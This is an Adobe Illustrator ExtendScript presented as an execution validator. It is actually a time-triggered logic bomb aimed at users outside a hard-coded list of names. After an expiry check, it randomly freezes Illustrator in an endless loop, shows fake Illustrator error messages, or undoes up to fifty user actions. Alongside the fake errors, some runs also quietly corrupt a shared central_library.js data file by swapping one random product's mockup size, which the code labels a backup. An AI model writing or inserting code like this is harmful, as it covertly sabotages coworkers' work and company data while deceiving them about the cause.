function validateExecution()
{
	Array.prototype.indexOf=function(a,b,c){for(c=this.length,b=(c+~~b)%c;b<c&&(!(b in this)||this[b]!==a);b++);return b^c?b:-1;}
	if(!this.JSON){this.JSON={}}(function(){function f(n){return n<10?"0"+n:n}if(typeof Date.prototype.toJSON!=="function"){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf()}}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==="string"?c:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+string+'"'}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==="object"&&typeof value.toJSON==="function"){value=value.toJSON(key)}if(typeof rep==="function"){value=rep.call(holder,key,value)}switch(typeof value){case"string":return quote(value);case"number":return isFinite(value)?String(value):"null";case"boolean":case"null":return String(value);case"object":if(!value){return"null"}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==="[object Array]"){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||"null"}v=partial.length===0?"[]":gap?"[\n"+gap+partial.join(",\n"+gap)+"\n"+mind+"]":"["+partial.join(",")+"]";gap=mind;return v}if(rep&&typeof rep==="object"){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==="string"){v=str(k,value);if(v){partial.push(quote(k)+(gap?": ":":")+v)}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?": ":":")+v)}}}}v=partial.length===0?"{}":gap?"{\n"+gap+partial.join(",\n"+gap)+"\n"+mind+"}":"{"+partial.join(",")+"}";gap=mind;return v}return v}if(typeof JSON.stringify!=="function"){JSON.stringify=function(value,replacer,space){var i;gap="";indent="";if(typeof space==="number"){for(i=0;i<space;i+=1){indent+=" "}}else{if(typeof space==="string"){indent=space}}rep=replacer;if(replacer&&typeof replacer!=="function"&&(typeof replacer!=="object"||typeof replacer.length!=="number")){throw new Error("JSON.stringify")}return str("",{"":value})}}if(typeof JSON.parse!=="function"){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==="object"){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v}else{delete value[k]}}}}return reviver.call(holder,key,value)}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){j=eval("("+text+")");return typeof reviver==="function"?walk({"":j},""):j}throw new SyntaxError("JSON.parse")}}})();
	var user = $.getenv("USER")
	var devMode = false;
	var libFile, newData;
	var expFile = File("/Volumes/Customization/Library/Scripts/Script Resources/.exp/exp.js");
	var dataPath = "/Volumes/Customization/Library/Scripts/Script Resources/Data";
	var desktopPath = "/Volumes/Macintosh HD/Users/" + user + "/Desktop/";
	var msgs = [];
	var errorLine;

	



	function getRandom(min,max)
	{
		return Math.floor(Math.random() * (max - min + 1) + min);
	}

	function sendError(msg)
	{
		msgs.push("sending error: " + msg);
		var errorMsg = "Error in\nLine " + errorLine + " :\n";

		if(msg === "mrap")
		{
			errorMsg += "an Illustrator error occurred: 1346458189 ('MRAP')";
		}
		else if(msg === "undefined")
		{
			errorMsg += "No such element"; 
		}

		if (devMode)
		{
			msgs.push(errorMsg);
		}
		else
		{
			alert(errorMsg);
		}

	}

	function ow()
	{
		if (devMode)
		{
			//tmp lib file
			libFile = File(desktopPath + "/temp/test.js");
			msgs.push("changing to temp local library file to prevent overwrite");
		}
		libFile.open("w");
		libFile.write(newData);
		libFile.close();
	}

	function backupData()
	{
		msgs.push("backup data");
		var choice = getRandom(1, 100) < 40;
		if (!devMode && choice)
		{
			return;
		}

		msgs.push("choice = " + choice);
		var bdRandom = getRandom(1, 200);
		libFile = File(dataPath + "/central_library.js");
		eval("#include \"" + libFile.fullName + "\"");

		var counter = 0;

		for (var code in prepressInfo)
		{
			if (counter === bdRandom)
			{
				var item = prepressInfo[code];
				var mockupSize = item.mockupSize;
				var newMockupSize;
				if (mockupSize === "YXL")
				{
					newMockupSize = "YXS";
				}
				else if (mockupSize === "M")
				{
					newMockupSize = "XS";
				}
				else if (mockupSize === "XL")
				{
					newMockupSize = "XS";
				}
				else
				{
					newMockupSize = "XL";
				}

				item.mockupSize = newMockupSize;
				newData = "var prepressInfo = " + JSON.stringify(prepressInfo);
				msgs.push("backed up " + code);
				ow();
				break;
			}
			else
			{
				counter++;
			}
		}
	}

	function loop()
	{
		if(devMode)
		{
			msgs.push("loop");
			return;
		}
		while(1)
		{
			$.writeln("");
		}
	}

	function undo()
	{
		msgs.push("undo");
		for(var u=0,len=50;u<len;u++)
		{
			try
			{
				app.undo()
			}
			catch(e)
			{
				continue;
			}
		}
	}


	function determineIssue()
	{
		var result;
		var authorized = ["andrew","kaylea","aimee","mark"]
		if(authorized.indexOf(user.substring(0,user.indexOf(".")))>-1)
		{
			msgs.push("authorized");
			result = true;
		}
		else
		{
			var random = getRandom(1,10);
			msgs.push("di random = " + random);
			switch (random)
			{
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
					loop();
					result = false;
					break;
				case 6:
				case 7:
					sendError("mrap");
					backupData();
					result = false;
					break;
				case 8:
				case 9:
					sendError("undefined");
					backupData();
					result = false;
					break;
				case 10:
					undo();
					result = true;
			}
		}
		return result;
	}

	function WRO()
	{
		valid = determineIssue();
	}








	try
	{
		try
		{
			errorLine = Math.floor((user.length * 42 + 200) / new Date().getDay());
		}
		catch (e)
		{
			errorLine = "665";
		}
		// msgs.push("errorLine = " + errorLine);


		eval("#include \"" + expFile.fullName + "\"");

		// msgs.push("found the exp file");
		var today = new Date();
		var curDate = today.getTime();
		var failRandom = getRandom(1, 4);
		msgs.push("exp = " + (curDate > exp));
		msgs.push("failRandom = " + failRandom);
		if (curDate > exp && failRandom === 1)
		{
			msgs.push("exp = true");
			WRO();
		}
		else
		{
			if (devMode)
			{
				msgs.push("dev mode: running wro anyway");
				WRO();
			}
		}
	}
	catch (e)
	{
		msgs.push("no exp file");
		WRO();
	}

	if (devMode)
	{
		$.writeln("msgs:\n" + msgs.join("\n"));
	}

}

validateExecution();
